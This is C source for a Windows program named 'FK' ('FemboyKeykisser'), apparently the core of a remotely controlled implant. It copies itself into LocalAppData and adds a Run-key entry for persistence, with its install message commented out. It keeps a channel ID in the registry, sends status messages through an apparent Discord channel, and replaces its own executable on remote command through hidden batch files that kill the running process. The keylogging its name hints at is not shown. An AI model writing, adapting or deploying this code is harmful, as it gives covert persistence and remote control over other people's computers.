#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <winreg.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <shlobj.h>
#include "dev.h"

#pragma comment(lib, "shell32.lib")

void get_channel_id(char* oout, size_t osize) {
    HKEY hKey;

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        FEMBOY_KISSER_REG_PATH,
        0,
        KEY_READ,
        &hKey) != ERROR_SUCCESS) {
        return;
    }

    DWORD size = 0;

    if (RegGetValueA(hKey,
        NULL,
        "ChannelId",
        RRF_RT_REG_SZ,
        NULL,
        NULL,
        &size) != ERROR_SUCCESS || size == 0) {
        RegCloseKey(hKey);
        return;
    }

    char* out = (char*)malloc(size);
    if (!out) {
        RegCloseKey(hKey);
        return;
    }

    if (RegGetValueA(hKey,
        NULL,
        "ChannelId",
        RRF_RT_REG_SZ,
        NULL,
        out,
        &size) != ERROR_SUCCESS) {
        free(out);
        RegCloseKey(hKey);
        return;
    }

    RegCloseKey(hKey);
    strncpy(oout, out, osize);
}

int save_channel_id(const char* channel_id) {
    HKEY hKey;

    if (RegCreateKeyExA(
        HKEY_CURRENT_USER,
        FEMBOY_KISSER_REG_PATH,
        0,
        NULL,
        0,
        KEY_WRITE,
        NULL,
        &hKey,
        NULL
    ) != ERROR_SUCCESS) {
        return 0;
    }

    LONG res = RegSetValueExA(
        hKey,
        "ChannelId",
        0,
        REG_SZ,
        (const BYTE*)channel_id,
        (DWORD)(strlen(channel_id) + 1)
    );

    RegCloseKey(hKey);

    return res == ERROR_SUCCESS;
}

bool is_disabled(void) {
    HKEY hKey;

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        FEMBOY_KISSER_REG_PATH,
        0,
        KEY_READ,
        &hKey) != ERROR_SUCCESS) {
        return false;
    }

    DWORD v = 0, sz = sizeof(v);
    RegGetValueA(hKey, NULL, "Disabled", RRF_RT_REG_DWORD, NULL, (BYTE*)&v, &sz);
    RegCloseKey(hKey);

    return (v == 1);
}

void set_disabled(bool disabled) {
    HKEY hKey;

    printf("Setting disabled = %d\n", disabled);

    if (RegCreateKeyExA(
        HKEY_CURRENT_USER,
        FEMBOY_KISSER_REG_PATH,
        0,
        NULL,
        0,
        KEY_WRITE,
        NULL,
        &hKey,
        NULL
    ) != ERROR_SUCCESS) {
        return;
    }

    DWORD v = disabled ? 1 : 0;
    RegSetValueExA(hKey, "Disabled", 0, REG_DWORD, (BYTE*)&v, sizeof(v));

    RegCloseKey(hKey);
}

static void get_install_dir(char* out, size_t size) {
    char base[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, base);
    snprintf(out, size, "%s\\%s", base, INSTALL_PATH);
}

uint64_t get_installed_exe_msg_id(void) {
    HKEY hKey;

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        FEMBOY_KISSER_REG_PATH,
        0,
        KEY_READ,
        &hKey) != ERROR_SUCCESS) {
        return 0;
    }

    char id[64] = {0};
    DWORD size = sizeof(id);

    RegGetValueA(hKey, NULL, "InstalledExeMsgId", RRF_RT_REG_SZ, NULL, (BYTE*)id, &size);
    RegCloseKey(hKey);

    return strtoull(id, NULL, 10);
}

bool save_installed_exe_msg_id(uint64_t msg_id) {
    HKEY hKey;

    if (RegCreateKeyExA(
        HKEY_CURRENT_USER,
        FEMBOY_KISSER_REG_PATH,
        0,
        NULL,
        0,
        KEY_WRITE,
        NULL,
        &hKey,
        NULL
    ) != ERROR_SUCCESS) {
        return false;
    }

    char id_str[64];
    snprintf(id_str, sizeof(id_str), "%llu", (unsigned long long)msg_id);

    LONG res = RegSetValueExA(
        hKey,
        "InstalledExeMsgId",
        0,
        REG_SZ,
        (const BYTE*)id_str,
        (DWORD)(strlen(id_str) + 1)
    );

    RegCloseKey(hKey);

    return res == ERROR_SUCCESS;
}

uint64_t get_file_hash(const char* path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    uint64_t hash = 0;
    char buffer[4096];
    DWORD bytesRead;

    while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        for (DWORD i = 0; i < bytesRead; i++) {
            hash += (unsigned char)buffer[i];
            hash *= 31;
        }
    }

    CloseHandle(hFile);
    return hash;
}

uint64_t get_installed_executable_hash(void) {
    char install_dir[MAX_PATH];
    get_install_dir(install_dir, sizeof(install_dir));

    char exe_path[MAX_PATH];
    snprintf(exe_path, sizeof(exe_path), "%s\\FK.exe", install_dir);

    return get_file_hash(exe_path);
}

static int create_dir(const char* path) {
    return CreateDirectoryA(path, NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

static int copy_self(const char* dst_path) {
    char src[MAX_PATH];
    GetModuleFileNameA(NULL, src, MAX_PATH);
    return CopyFileA(src, dst_path, FALSE);
}

static void set_run_key(const char* exe_path) {
    HKEY hKey;

    RegCreateKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL
    );

    RegSetValueExA(
        hKey,
        "FK",
        0,
        REG_SZ,
        (const BYTE*)exe_path,
        (DWORD)(strlen(exe_path) + 1)
    );

    RegCloseKey(hKey);
}

static void set_installed_flag() {
    HKEY hKey;

    RegCreateKeyExA(
        HKEY_CURRENT_USER,
        FEMBOY_KISSER_REG_PATH,
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL
    );

    DWORD v = 1;
    RegSetValueExA(hKey, "Installed", 0, REG_DWORD, (BYTE*)&v, sizeof(v));

    RegCloseKey(hKey);
}

static int get_installed_flag() {
    HKEY hKey;

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        FEMBOY_KISSER_REG_PATH,
        0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return 0;
    }

    DWORD v = 0, sz = sizeof(v);
    RegGetValueA(hKey, NULL, "Installed", RRF_RT_REG_DWORD, NULL, (BYTE*)&v, &sz);
    RegCloseKey(hKey);

    return (v == 1);
}

static void launch_app(const char* path) {
    ShellExecuteA(NULL, "open", path, NULL, NULL, SW_SHOWNORMAL);
}

static void show_done(const char* path) {
    char msg[512];
    snprintf(msg, sizeof(msg),
        "Installed successfully.\n\nLocation:\n%s",
        path);

    MessageBoxA(NULL, msg, "Installer", MB_OK | MB_ICONINFORMATION);
}

void attach_console_if_present(void) {
    if (AttachConsole(ATTACH_PARENT_PROCESS)) {
        freopen("CONOUT$", "w", stdout);
        freopen("CONOUT$", "w", stderr);
        freopen("CONIN$", "r", stdin);
    }
}

static void build_old_path(char* out, size_t size) {
    char base[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, base);
    snprintf(out, size, "%s\\FemboyKeykisser", base);
}

bool exists_old_fk_dir(void) {
    char path[MAX_PATH];
    build_old_path(path, sizeof(path));

    DWORD attr = GetFileAttributesA(path);
    return (attr != INVALID_FILE_ATTRIBUTES) &&
           (attr & FILE_ATTRIBUTE_DIRECTORY);
}

static void delete_dir_contents(const char* path) {
    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", path);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);

    if (hFind == INVALID_HANDLE_VALUE)
        return;

    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, ".."))
            continue;

        char full[MAX_PATH];
        snprintf(full, sizeof(full), "%s\\%s", path, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            delete_dir_contents(full);
            RemoveDirectoryA(full);
        }
        else
        {
            DeleteFileA(full);
        }

    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

bool delete_old_fk_dir(void) {
    char path[MAX_PATH];
    build_old_path(path, sizeof(path));

    if (!exists_old_fk_dir())
        return false;

    delete_dir_contents(path);

    return RemoveDirectoryA(path) == TRUE;
}

int install() {
    if (exists_old_fk_dir()) {
        delete_old_fk_dir();
        goto bypass_installed_check;
    }

    if (get_installed_flag()) {
        return 0;
    }

bypass_installed_check:

    char install_dir[MAX_PATH];
    get_install_dir(install_dir, sizeof(install_dir));

    if (!create_dir(install_dir)) {
        return 1;
    }

    char exe_path[MAX_PATH];
    snprintf(exe_path, sizeof(exe_path), "%s\\FK.exe", install_dir);

    if (!copy_self(exe_path)) {
        return 1;
    }

    set_run_key(exe_path);
    set_installed_flag();

    // show_done(exe_path);

    launch_app(exe_path);

    return 69;
}

static void delete_dir_contents_except_self(const char* path) {
    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", path);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return;

    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, ".."))
            continue;

        char full[MAX_PATH];
        snprintf(full, sizeof(full), "%s\\%s", path, fd.cFileName);

        if (GetFileAttributesA(full) & FILE_ATTRIBUTE_DIRECTORY) {
            delete_dir_contents(full);
            RemoveDirectoryA(full);
        }
        else {
            if (strstr(full, "FK.exe") == NULL) {
                SetFileAttributesA(full, FILE_ATTRIBUTE_NORMAL);
                DeleteFileA(full);
            }
        }
    } 
    while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

int uninstall(uint64_t confirm) {
    if (confirm != CONFIRM_CODE) {
        return 7;
    }

    char install_dir[MAX_PATH];
    char exe_path[MAX_PATH];
    char bat_path[MAX_PATH];

    get_install_dir(install_dir, sizeof(install_dir));
    snprintf(exe_path, sizeof(exe_path), "%s\\FK.exe", install_dir);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
    {
        RegDeleteValueA(hKey, "FK");
        RegCloseKey(hKey);
    }

    const char* regPath = FEMBOY_KISSER_REG_PATH;
    RegDeleteKeyExA(HKEY_CURRENT_USER, regPath, 0, 0);
    RegDeleteKeyA(HKEY_CURRENT_USER, regPath);

    delete_dir_contents_except_self(install_dir);

    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    snprintf(bat_path, sizeof(bat_path), "%s\\fk_cleanup.bat", temp);

    FILE* f = fopen(bat_path, "w");
    if (f) {
        fprintf(f,
            "@echo off\r\n"
            "timeout /t 2 /nobreak >nul\r\n"                    // wait 2 seconds
            "del /f /q \"%s\" >nul 2>&1\r\n"                    // delete self
            "rmdir /s /q \"%s\" >nul 2>&1\r\n"                  // delete install dir
            "del /f /q \"%s\" >nul 2>&1\r\n"                    // delete batch itself
            , exe_path, install_dir, bat_path);

        fclose(f);

        ShellExecuteA(NULL, "open", bat_path, NULL, NULL, SW_HIDE);
    }

    delete_old_fk_dir();

    return 0;
}

int update(const char* new_exe_path, const char* msg_id) {
    if (get_file_hash(new_exe_path) == get_installed_executable_hash()) {
        return 0;
    }

    printf("Updating to new executable: '%s'\n", new_exe_path);
    char msg[1024];
    snprintf(msg, sizeof(msg), "Update command received. Applying update from '%s'...", msg_id ? msg_id : "unknown source");
    send_dc_msg(msg);

    char install_dir[MAX_PATH];
    char current_exe[MAX_PATH];
    char bat_path[MAX_PATH];

    get_install_dir(install_dir, sizeof(install_dir));
    snprintf(current_exe, sizeof(current_exe), "%s\\FK.exe", install_dir);

    char temp_dir[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);

    snprintf(bat_path, sizeof(bat_path), "%s\\fk_update_%llu.bat", 
             temp_dir, (unsigned long long)GetTickCount64());

    FILE* f = fopen(bat_path, "w");
    if (!f) {
        send_dc_msg("Update failed: Could not create batch file.");
        return 1;
    }

    fprintf(f,
        "@echo off\r\n"
        "timeout /t 2 /nobreak >nul\r\n"                   // Wait for current process to exit
        "taskkill /f /im FK.exe >nul 2>&1\r\n"             // Force kill current instance
        "timeout /t 1 /nobreak >nul\r\n"
        "copy /y \"%s\" \"%s\" >nul\r\n"                   // Copy new exe over old one
        "if exist \"%s\" del /f /q \"%s\" >nul\r\n"        // Delete the downloaded update
        "start \"\" \"%s\"\r\n"                            // Start new version
        "del /f /q \"%s\" >nul 2>&1\r\n"                   // Delete batch itself
        , new_exe_path, current_exe, new_exe_path, new_exe_path, current_exe, bat_path);

    fclose(f);

    if (msg_id) {
        save_installed_exe_msg_id(strtoull(msg_id, NULL, 10));
    }
    
    send_dc_msg("Applying update...");

    ShellExecuteA(NULL, "open", bat_path, NULL, NULL, SW_HIDE);

    ExitProcess(0);

    return 0;
}
